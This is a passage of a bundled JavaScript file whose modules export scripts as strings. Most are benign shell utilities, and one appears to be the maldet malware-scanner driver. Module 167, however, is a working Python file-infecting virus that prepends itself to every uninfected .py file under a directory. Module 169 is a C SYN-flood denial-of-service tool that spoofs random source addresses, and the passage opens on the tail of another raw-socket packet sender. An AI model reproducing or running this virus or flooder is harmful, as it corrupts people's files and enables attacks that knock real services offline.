SOCK_RAW, IPPROTO_RAW); <br/> 	if(sd==-1) error('Could not create socket.'); <br/> 	else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)); <br/> 	 <br/> 	free(psgram); <br/> 	close(sd); <br/> 	 <br/> 	return; <br/> } <br/> ";
},{}],163:[function(require,module,exports){
module.exports="#!/bin/sh <br/>  <br/> # echon - a script to emulate the -n flag functionality with 'echo'  <br/> #   for Unix systems that don't have that available. <br/>  <br/> echon() <br/> { <br/>   echo '$*' | tr -d '\n' <br/> } <br/>  <br/> echon 'this is a test: ' <br/> read answer <br/>  <br/> echon this is a test too ' ' <br/> read answer2 <br/>  <br/> ";
},{}],164:[function(require,module,exports){
module.exports="#!/bin/sh <br/> # inpath - verify that a specified program is either valid as-is, <br/> #   or can be found in the PATH directory list. <br/>  <br/> in_path() <br/> { <br/> 	# given a command and the PATH, try to find the command. Returns <br/> 	# 0 if found and executable, 1 if not. Note that this temporarily modifies  <br/> 	# the the IFS (input field seperator), but restores it upon completion. <br/>  <br/> 	cmd=$1        path=$2         retval=1 <br/> 	oldIFS=$IFS   IFS=':' <br/>  <br/> 	for directory in $path <br/> 	do <br/> 		if [ -x $directory/$cmd ] ; then <br/> 			retval=0      # if we're here, we found $cmd in $directory <br/> 		fi <br/> 	done <br/> 	IFS=$oldIFS <br/> 	return $retval <br/> } <br/>  <br/> checkForCmdInPath() <br/> { <br/> 	var=$1 <br/> 	 <br/> 	# The variable slicing notation in the following conditional  <br/> 	# needs some explanation: ${var#expr} returns everything after <br/> 	# the match for 'expr' in the variable value (if any), and <br/> 	# ${var%expr} returns everything that doesn't match (in this <br/> 	# case just the very first character. You can also do this in <br/> 	# Bash with ${var:0:1} and you could use cut too: cut -c1 <br/>  <br/> 	if [ '$var' != '' ] ; then <br/> 		if [ '${var%${var#?}}' = '/' ] ; then <br/> 			if [ ! -x $var ] ; then <br/> 				return 1 <br/> 			fi <br/> 		elif ! in_path $var $PATH ; then <br/> 			return 2 <br/> 		fi  <br/> 	fi <br/> } <br/>  <br/> if [ $# -ne 1 ] ; then <br/>  echo 'Usage: $0 command' >&2 ; exit 1 <br/> fi <br/>  <br/> checkForCmdInPath '$1' <br/> case $? in <br/> 	0 ) echo '$1 found in PATH'			;; <br/> 	1 ) echo '$1 not found or not executable'	;; <br/> 	2 ) echo '$1 not found in PATH'		;; <br/> esac <br/>  <br/> exit 0 <br/>  <br/> ";
},{}],165:[function(require,module,exports){
module.exports="#!/usr/bin/env bash <br/> # <br/> ## <br/> ## <br/> # <br/> PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin <br/>  <br/> inspath=/usr/local/maldetect <br/> cnf='$inspath/conf.maldet' <br/> intcnf='$inspath/internals/internals.conf' <br/> intfunc='$inspath/internals/functions' <br/>  <br/> if [ -f '$cnf' ]; then <br/> 	source $cnf <br/> else <br/> 	header <br/> 	echo 'maldet($$): {glob} $cnf not found, aborting.' <br/> 	exit 1 <br/> fi <br/>  <br/> if [ -f '$intcnf' ]; then <br/> 	source $intcnf <br/> else <br/> 	header <br/> 	echo 'maldet($$): {glob} $intcnf not found, aborting.' <br/> 	exit 1 <br/> fi <br/>  <br/> if [ -f '$intfunc' ]; then <br/> 	source $intfunc <br/> else <br/> 	header <br/> 	echo 'maldet($$): {glob} $intfunct not found, aborting.' <br/> 	exit 1 <br/> fi <br/>  <br/> # prerun operations <br/> prerun <br/>  <br/> # import any remote configuration data <br/> import_conf <br/>  <br/> if [ -z '$1' ]; then <br/> 	header <br/> 	usage_short <br/> else <br/> 	while [ -n '$1' ]; do <br/> 		case '$1' in <br/> 			--mkpubpaths) <br/> 				if [ '$scan_user_access' == '1' ]; then <br/> 					chmod 711 $inspath/pub <br/> 					for user in `cat /etc/passwd | cut -d ':' -f1`; do <br/> 						uid=`id --user $user` <br/> 						if [ -z '$uid' ]; then <br/> 							uid=9 <br/> 						fi <br/> 						if [ -z '$scan_user_access_minuid' ]; then <br/> 							scan_user_access_minuid=10 <br/> 						fi <br/> 						if [ '$uid' -ge '$scan_user_access_minuid' ] && [ ! -d '$inspath/pub/$user' ]; then <br/> 							mkdir -p $inspath/pub/$user/quar $inspath/pub/$user/sess $inspath/pub/$user/tmp >> /dev/null 2>&1 <br/> 							touch $inspath/pub/$user/event_log >> /dev/null 2>&1 <br/> 							chown -R $user.$user $inspath/pub/$user >> /dev/null 2>&1 <br/> 							chmod 750 $inspath/pub/$user $inspath/pub/$user/quar $inspath/pub/$user/sess $inspath/pub/$user/tmp >> /dev/null 2>&1 <br/> 							chmod 640 $inspath/pub/$user/event_log >> /dev/null 2>&1 <br/> 							eout '{glob} created public scanning paths for user $user' <br/> 						fi <br/> 						unset uid user <br/> 					done <br/> 					exit <br/> 				else <br/> 					header <br/> 					echo 'public scanning support not enabled in conf.maldet, aborting.' <br/> 					exit <br/> 				fi <br/> 			;; <br/> 			-hscan|--hook-scan|--modsec) <br/> 				hscan=1 <br/> 			;; <br/> 			-U|--user) <br/> 				shift <br/> 				user='$1' <br/> 				quardir=$inspath/pub/$user/quar <br/> 				sessdir=$inspath/pub/$user/sess <br/> 				tmpdir=$inspath/pub/$user/tmp <br/> 				maldet_log=$inspath/pub/$user/event_log <br/> 			;; <br/> 			-co|--config-option) <br/> 				shift <br/> 				user=`whoami` <br/> 				if [ ! '$user' == 'root' ]; then <br/> 					tmpdir=$inspath/pub/$user/tmp <br/> 				fi <br/> 				tmpco=$tmpdir/config.cli <br/> 				rm -f $tmpco <br/> 				touch $tmpco <br/> 				echo $1 | sed -e 's/--config-option //' -e 's/-co //' | tr -d ' ' | tr ',' '\n' > $tmpco <br/> 				. $tmpco <br/> 				rm -f $tmpco <br/> 			;; <br/> 			-qd) <br/> 				shift <br/> 				if [ -d '$1' ];  then <br/> 					eout '{scan} set quarantine path: $1' 1 <br/> 					quardir='$1' <br/> 				fi <br/> 			;; <br/> 			-b|--background) <br/> 				set_background=1 <br/> 			;; <br/> 			-c|--checkout) <br/> 				shift <br/> 				header <br/> 				checkout '$1' <br/> 			;; <br/> 			-x|--exclude-regex) <br/> 				shift <br/> 				if [ '$1' ]; then <br/> 					exclude_regex='$1' <br/> 				fi <br/> 			;; <br/> 			-i|--include-regex) <br/> 				shift <br/> 				if [ '$1' ]; then <br/> 					include_regex='-regex $1' <br/> 				fi <br/> 			;; <br/> 			--alert-daily|--monitor-report) <br/> 				genalert digest <br/> 			;; <br/> 			-m|--monitor) <br/> 				header <br/> 				shift <br/> 				if [ '$OSTYPE' == 'FreeBSD' ]; then <br/> 					eout '{mon} not currently supported under FreeBSD' 1 <br/> 				elif [ '$1' == 'reload' ] || [ '$1' == 'RELOAD' ]; then <br/> 					eout '{mon} queued monitor for configuration reload' 1 <br/> 					touch $inspath/reload_monitor <br/> 				else <br/> 					svc=m <br/> 					trap trap_exit 2 <br/> 					monitor_init '$1' <br/> 				fi <br/> 			;; <br/> 			-k|--kill-monitor|-kill) <br/> 				header <br/> 				if [ '$OSTYPE' == 'FreeBSD' ]; then <br/> 					eout '{mon} not currently supported under FreeBSD' 1 <br/> 				else <br/> 					eout '{mon} sent kill to monitor service' 1 <br/> 					monitor_kill <br/> 				fi <br/> 			;; <br/> 			-f|--file-list) <br/> 				shift <br/> 				if [ -z '$hscan' ]; then <br/> 					header <br/> 				fi <br/> 				svc=f <br/> 				trap trap_exit 2 <br/> 				file_list='$1' <br/> 				if [ ! -f '$file_list' ]; then <br/> 					eout '{scan} file does not exist ($1)' 1 <br/> 					exit 1 <br/> 					elif [ ! -s '$file_list' ]; then <br/> 					eout '{scan} file list is empty ($1)' 1 <br/> 					exit 1 <br/> 				fi <br/> 				if [ '$set_background' == '1' ]; then <br/> 					eout '{scan} launching scan of $spath to background, see $maldet_log for progress' 1 <br/> 					scan '$spath' '$file_list' >> /dev/null 2>&1 & <br/> 				else <br/> 					scan '$spath' '$file_list' <br/> 				fi <br/> 			;; <br/> 			-a|--scan-all) <br/> 				shift <br/> 				if [ -z '$hscan' ]; then <br/> 					header <br/> 				fi <br/> 				svc=a <br/> 				trap trap_exit 2 <br/> 				spath='$1' <br/> 				if [ '$spath' == '' ]; then <br/> 					spath=/home <br/> 				fi <br/> 				if [ '$set_background' == '1' ]; then <br/> 					eout '{scan} launching scan of $spath to background, see $maldet_log for progress' 1 <br/> 					scan '$spath' all >> /dev/null 2>&1 & <br/> 				else <br/> 					scan '$spath' all <br/> 				fi <br/> 			;; <br/> 			-r|--scan-recent) <br/> 				header <br/> 				svc=r <br/> 				trap trap_exit 2 <br/> 				shift <br/> 				spath='$1' <br/> 				shift <br/> 				days='$1' <br/> 				if [ -z '$spath' ]; then <br/> 					eout '{scan} no path defined' 1 <br/> 					exit <br/> 				fi <br/> 				if [ -z '$days' ]; then <br/> 					days=7 <br/> 				fi <br/> 				if [ '$set_background' == '1' ]; then <br/> 					eout '{scan} launching scan of $spath changes in last ${days}d to background, see $maldet_log for progress' 1 <br/> 					scan '$spath' '$days' >> /dev/null 2>&1 & <br/> 				else <br/> 					scan '$spath' '$days' <br/> 				fi <br/> 			;; <br/> 			-l|--log) <br/> 				header <br/> 				view <br/> 			;; <br/> 			-e|--report) <br/> 				header <br/> 				shift <br/> 				view_report '$1' '$2' <br/> 			;; <br/> 			-p|--purge) <br/> 				header <br/> 				purge <br/> 			;; <br/> 			-d|--update-ver|--update-version) <br/> 				header <br/> 				lmdup <br/> 			;; <br/> 			-u|--update|--update-sigs) <br/> 				shift <br/> 				if [ ! '$1' == '1' ]; then <br/> 					header <br/> 				fi <br/> 				sigup <br/> 			;; <br/> 			-s|--restore) <br/> 				header <br/> 				shift <br/> 				if [ -f '$sessdir/session.hits.$1' ]; then <br/> 					restore_hitlist '$1' <br/> 				else <br/> 					restore '$1' <br/> 				fi <br/> 			;; <br/> 			-q|--quarantine) <br/> 				header <br/> 				shift <br/> 				quar_hitlist '$1' <br/> 			;; <br/> 			-n|--clean) <br/> 				header <br/> 				shift <br/> 				clean_hitlist '$1' <br/> 			;; <br/> 			-h|--help) <br/> 				header <br/> 				usage_long | more <br/> 			;; <br/> 			*) <br/> 				header <br/> 				usage_short <br/> 		esac <br/> 		shift <br/> 	done <br/> fi <br/>  <br/> # postrun operations <br/> postrun <br/> ";
},{}],166:[function(require,module,exports){
module.exports="#!/bin/sh <br/>  <br/> # nicenumber - given a number, show it with comma separated values <br/> #    expects DD and TD to be instantiated. instantiates nicenum <br/> #    or, if a second arg is specified, the output is echoed to stdout <br/>  <br/> nicenumber() <br/> { <br/> 	# Note that we use the '.' as the decimal separator for parsing <br/> 	# the INPUT value to this script. The output value is as specified <br/> 	# by the user with the -d flag, if different from a '.' <br/> 	 <br/> 	integer=$(echo $1 | cut -d. -f1)		# left of the decimal <br/> 	decimal=$(echo $1 | cut -d. -f2)		# right of the decimal <br/> 	 <br/> 	if [ $decimal != $1 ]; then <br/> 		# there's a fractional part, let's include it. <br/> 		result='${DD:='.'}$decimal' <br/> 	fi <br/> 	 <br/> 	thousands=$integer <br/> 	 <br/> 	while [ $thousands -gt 999 ]; do <br/> 		remainder=$(($thousands % 1000))	# three least significant digits <br/> 	 <br/> 		while [ ${#remainder} -lt 3 ] ; do	# force leading zeroes as needed <br/> 			remainder='0$remainder' <br/> 		done <br/> 		 <br/> 		thousands=$(($thousands / 1000))	# to left of remainder, if any <br/> 		result='${TD:=','}${remainder}${result}'	# builds right-to-left <br/> 	done <br/> 	 <br/> 	nicenum='${thousands}${result}' <br/> 	if [ ! -z $2 ] ; then <br/> 		echo $nicenum <br/> 	fi <br/> } <br/> 	 <br/> DD='.'	# decimal point delimiter, between integer & fractional value <br/> TD=','	# thousands delimiter, separates every three digits  <br/> 	 <br/> while getopts 'd:t:' opt; do <br/> 	case $opt in <br/> 		d ) DD='$OPTARG'	;; <br/> 		t ) TD='$OPTARG'	;; <br/> 	esac <br/> done <br/>  <br/> shift $(($OPTIND - 1)) <br/>  <br/> if [ $# -eq 0 ] ; then <br/> 	cat << 'EOF' >&2 <br/> Usage: $(basename $0) [-d c] [-t c] numeric value <br/> 			 -d specifies the decimal point delimiter (default '.') <br/> 			 -t specifies the thousands delimiter (default ',') <br/> EOF <br/> 	exit 1 <br/> fi <br/>  <br/> nicenumber $1 1		# second arg forces this to 'echo' output <br/>  <br/> exit 0 <br/>  <br/> ";
},{}],167:[function(require,module,exports){
module.exports="#!/usr/bin/python <br/> import os <br/> import datetime <br/> SIGNATURE = 'BURROWER PY' <br/> def search(path): <br/> 	filestoinfect = [] <br/> 	filelist = os.listdir(path) <br/> 	for fname in filelist: <br/> 		if os.path.isdir(path+'/'+fname): <br/> 			filestoinfect.extend(search(path+'/'+fname)) <br/> 		elif fname[-3:] == '.py': <br/> 			infected = False <br/> 			for line in open(path+'/'+fname): <br/> 				if SIGNATURE in line: <br/> 					infected = True <br/> 					break <br/> 			if infected == False: <br/> 				filestoinfect.append(path+'/'+fname) <br/> 	return filestoinfect <br/> def infect(filestoinfect): <br/> 	virus = open(os.path.abspath(__file__)) <br/> 	virusstring = '' <br/> 	for i,line in enumerate(virus): <br/> 		if i>=0 and i <39: <br/> 			virusstring += line <br/> 	virus.close <br/> 	for fname in filestoinfect: <br/> 		f = open(fname) <br/> 		temp = f.read() <br/> 		f.close() <br/> 		f = open(fname,'w') <br/> 		f.write(virusstring + temp) <br/> 		f.close() <br/> def bomb(): <br/> 	if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25: <br/> 		print 'HAPPY BIRTHDAY CRANKLIN!' <br/> filestoinfect = search(os.path.abspath('')) <br/> infect(filestoinfect) <br/> bomb()";
},{}],168:[function(require,module,exports){
module.exports="#!/bin/sh <br/> 	<br/> # scriptbc - wrapper for 'bc' that returns the value of a formula <br/> 	<br/> if [ $1 = '-p' ] ; then <br/> 	precision=$2 <br/> 	shift 2 <br/> else <br/> 	precision=2		# default <br/> fi <br/> 	<br/> bc -q -l << EOF <br/> scale=$precision <br/> $* <br/> quit <br/> EOF <br/> 	<br/> exit 0 <br/> ";
},{}],169:[function(require,module,exports){
module.exports="#include pthread.h <br/> #include unistd.h <br/> #include stdio.h <br/> #include stdlib.h <br/> #include string.h <br/> #include sys/socket.h <br/> #include netinet/ip.h <br/> #include netinet/tcp.h <br/>   <br/> #define MAX_PACKET_SIZE 4096 <br/> #define PHI 0x9e3779b9 <br/>   <br/> static uint32_t Q[4096], c = 362436; <br/>  <br/> struct thread_data{ <br/> 	int thread_id; <br/> 	unsigned int floodport; <br/> 	struct sockaddr_in sin; <br/> }; <br/>   <br/> void init_rand(uint32_t x) <br/> { <br/> 				int i; <br/>   <br/> 				Q[0] = x; <br/> 				Q[1] = x + PHI; <br/> 				Q[2] = x + PHI + PHI; <br/>   <br/> 				for (i = 3; i < 4096; i++) <br/> 								Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; <br/> } <br/>   <br/> uint32_t rand_cmwc(void) <br/> { <br/> 				uint64_t t, a = 18782LL; <br/> 				static uint32_t i = 4095; <br/> 				uint32_t x, r = 0xfffffffe; <br/> 				i = (i + 1) & 4095; <br/> 				t = a * Q[i] + c; <br/> 				c = (t >> 32); <br/> 				x = t + c; <br/> 				if (x < c) { <br/> 								x++; <br/> 								c++; <br/> 				} <br/> 				return (Q[i] = r - x); <br/> } <br/>  <br/> /* function for header checksums */ <br/> unsigned short csum (unsigned short *buf, int nwords) <br/> { <br/> 	unsigned long sum; <br/> 	for (sum = 0; nwords > 0; nwords--) <br/> 	sum += *buf++; <br/> 	sum = (sum >> 16) + (sum & 0xffff); <br/> 	sum += (sum >> 16); <br/> 	return (unsigned short)(~sum); <br/> } <br/> void setup_ip_header(struct iphdr *iph) <br/> { <br/> 	iph->ihl = 5; <br/> 	iph->version = 4; <br/> 	iph->tos = 0; <br/> 	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); <br/> 	iph->id = htonl(54321); <br/> 	iph->frag_off = 0; <br/> 	iph->ttl = MAXTTL; <br/> 	iph->protocol = 6;  // upper layer protocol, TCP <br/> 	iph->check = 0; <br/>  <br/> 	// Initial IP, changed later in infinite loop <br/> 	iph->saddr = inet_addr('192.168.3.100'); <br/> } <br/>  <br/> void setup_tcp_header(struct tcphdr *tcph) <br/> { <br/> 	tcph->source = htons(5678); <br/> 	tcph->seq = random(); <br/> 	tcph->ack_seq = 0; <br/> 	tcph->res2 = 0; <br/> 	tcph->doff = 5; // Make it look like there will be data <br/> 	tcph->syn = 1; <br/> 	tcph->window = htonl(65535); <br/> 	tcph->check = 0; <br/> 	tcph->urg_ptr = 0; <br/> } <br/>  <br/> void *flood(void *par1) <br/> { <br/> 	struct thread_data *td = (struct thread_data *)par1; <br/> 	char datagram[MAX_PACKET_SIZE]; <br/> 	struct iphdr *iph = (struct iphdr *)datagram; <br/> 	struct tcphdr *tcph = (/*u_int8_t*/void *)iph + (5 * sizeof(u_int32_t)); <br/> 	struct sockaddr_in sin = td->sin; <br/> 	char new_ip[sizeof '255.255.255.255']; <br/>  <br/> 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); <br/> 	if(s < 0){ <br/> 		fprintf(stderr, 'Could not open raw socket.\n'); <br/> 		exit(-1); <br/> 	} <br/>  <br/> 	unsigned int floodport = td->floodport; <br/>  <br/> 	// Clear the data <br/> 	memset(datagram, 0, MAX_PACKET_SIZE); <br/>  <br/> 	// Set appropriate fields in headers <br/> 	setup_ip_header(iph); <br/> 	setup_tcp_header(tcph); <br/>  <br/> 	tcph->dest = htons(floodport); <br/>  <br/> 	iph->daddr = sin.sin_addr.s_addr; <br/> 	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); <br/>  <br/> 	int tmp = 1; <br/> 	const int *val = &tmp; <br/> 	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){ <br/> 		fprintf(stderr, 'Error: setsockopt() - Cannot set HDRINCL!\n'); <br/> 		exit(-1); <br/> 	} <br/>  <br/> 	uint32_t random_num; <br/> 	uint32_t ul_dst; <br/> 	init_rand(time(NULL)); <br/> 	while(1){ <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		random_num = rand_cmwc(); <br/>  <br/> 		ul_dst = (random_num >> 24 & 0xFF) << 24 | <br/> 						 (random_num >> 16 & 0xFF) << 16 | <br/> 						 (random_num >> 8 & 0xFF) << 8 | <br/> 						 (random_num & 0xFF); <br/>  <br/> 		iph->saddr = ul_dst; <br/> 		tcph->source = htons(random_num & 0xFFFF); <br/> 		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		random_num = rand_cmwc(); <br/>  <br/> 		ul_dst = (random_num >> 24 & 0xFF) << 24 | <br/> 						 (random_num >> 16 & 0xFF) << 16 | <br/> 						 (random_num >> 8 & 0xFF) << 8 | <br/> 						 (random_num & 0xFF); <br/>  <br/> 		iph->saddr = ul_dst; <br/> 		tcph->source = htons(random_num & 0xFFFF); <br/> 		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		random_num = rand_cmwc(); <br/>  <br/> 		ul_dst = (random_num >> 24 & 0xFF) << 24 | <br/> 						 (random_num >> 16 & 0xFF) << 16 | <br/> 						 (random_num >> 8 & 0xFF) << 8 | <br/> 						 (random_num & 0xFF); <br/>  <br/> 		iph->saddr = ul_dst; <br/> 		tcph->source = htons(random_num & 0xFFFF); <br/> 		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		random_num = rand_cmwc(); <br/>  <br/> 		ul_dst = (random_num >> 24 & 0xFF) << 24 | <br/> 						 (random_num >> 16 & 0xFF) << 16 | <br/> 						 (random_num >> 8 & 0xFF) << 8 | <br/> 						 (random_num & 0xFF); <br/>  <br/> 		iph->saddr = ul_dst; <br/> 		tcph->source = htons(random_num & 0xFFFF); <br/> 		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); <br/> 		sendto(s, datagram, 